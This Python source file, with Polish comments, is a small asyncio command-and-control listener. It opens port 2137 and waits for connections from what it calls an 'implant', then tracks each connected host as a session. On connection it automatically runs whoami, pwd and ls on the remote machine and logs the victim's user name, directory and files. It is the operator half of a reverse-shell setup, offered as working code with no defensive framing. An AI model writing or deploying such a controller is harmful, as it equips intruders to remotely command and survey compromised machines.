#from pwn import *
from threading import *
from time import *
from asyncio import *
from uuid import *
sesje = {}

async def run_cmd(reader, writer, command):
    granica = str(uuid4()).encode()
    full_cmd = command.encode()+b'; echo -n '+ granica + b'\n'
    try:
        await wait_for(reader.read(4096), timeout=0.1)
    except TimeoutError:
        pass 
    writer.write(full_cmd)
    await writer.drain()
    odp = b""
    while granica not in odp:
        try:
            chunk = await wait_for(reader.read(4096),timeout=5)
            if not chunk:
                raise ConnectionError("[-]problem z połączeniem z implantem")
            odp+=chunk
        except TimeoutError:
            raise ConnectionError("[-]timeout ended")
    output = odp.rsplit(granica,1)[0]
    return output.strip()




async def handler(reader,writer):
    addr = writer.get_extra_info('peername')
    print(f"[N] znaleziono połączenie z {addr}")
    sesje[addr] = writer
    try:    
        output = await run_cmd(reader,writer,"whoami")
       # print(f"[C] komenda whoami dla {addr} wysłana")
        username = output.decode().strip()  
        print(f"[I] kolega {addr} ma na imie {username}")
        pwd = await run_cmd(reader, writer, "pwd")
        pwd = pwd.decode().strip()
        print(f"[I] kolega {username}@{addr} znajduje się w {pwd}")
        ls = await run_cmd(reader,writer, "ls")
        ls = ls.decode().strip()
        print(f"[I] ls dla {username}:\n {ls}")

        while True:
            data = await reader.read(1024)
            if not data:
                break
        print(f"[{addr}] Otrzymano: {data.decode().strip()}")

    except Exception as e:
        print(f"exception: {e}")
    finally:
        print(f"[-] zamykanie {addr}")
        writer.close()
        await writer.wait_closed()
        if addr in sesje: del sesje[addr]

async def main():
    server = await start_server(handler,'0.0.0.0','2137')
    print("[+] Serwer został uruchomiony")
    async with server:
        await server.serve_forever()

if __name__ == "__main__":
    try:
        run(main())
    except KeyboardInterrupt:
        pass
